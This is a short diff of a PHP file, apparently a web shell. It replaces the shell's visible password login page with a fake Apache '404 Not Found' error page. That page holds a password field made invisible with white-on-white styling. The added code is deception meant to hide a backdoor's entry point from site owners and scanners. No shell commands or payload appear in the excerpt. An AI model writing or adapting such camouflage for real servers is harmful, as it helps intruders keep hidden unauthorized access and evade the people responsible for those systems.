@@ -11,50 +11,20 @@ $default_charset = 'UTF-8';
 function show_login_page($message = "")
 {
 ?>
-    <!DOCTYPE html>
-    <html>
-    <!DOCTYPE html>
-    <html lang="en">
-
-    <head>
-        <meta charset="UTF-8">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            body {
-                font-family: monospace;
-            }
-
-            input[type="password"] {
-                border: none;
-                border-bottom: 1px solid black;
-                padding: 2px;
-            }
-
-            input[type="password"]:focus {
-                outline: none;
-            }
-
-            input[type="submit"] {
-                border: none;
-                padding: 4.5px 20px;
-                background-color: #2e313d;
-                color: #FFF;
-            }
-        </style>
-    </head>
-
-    <body>
-        <form action="" method="post">
-            <div align="center">
-                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
-            </div>
-        </form>
-    </body>
-
-    </html>
-
-    </html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+</head>
+<body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
+    <hr>
+    <form method="post">
+        <input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="pass">
+    </form>
+</body>
+</html>
 <?php
     exit;
 }
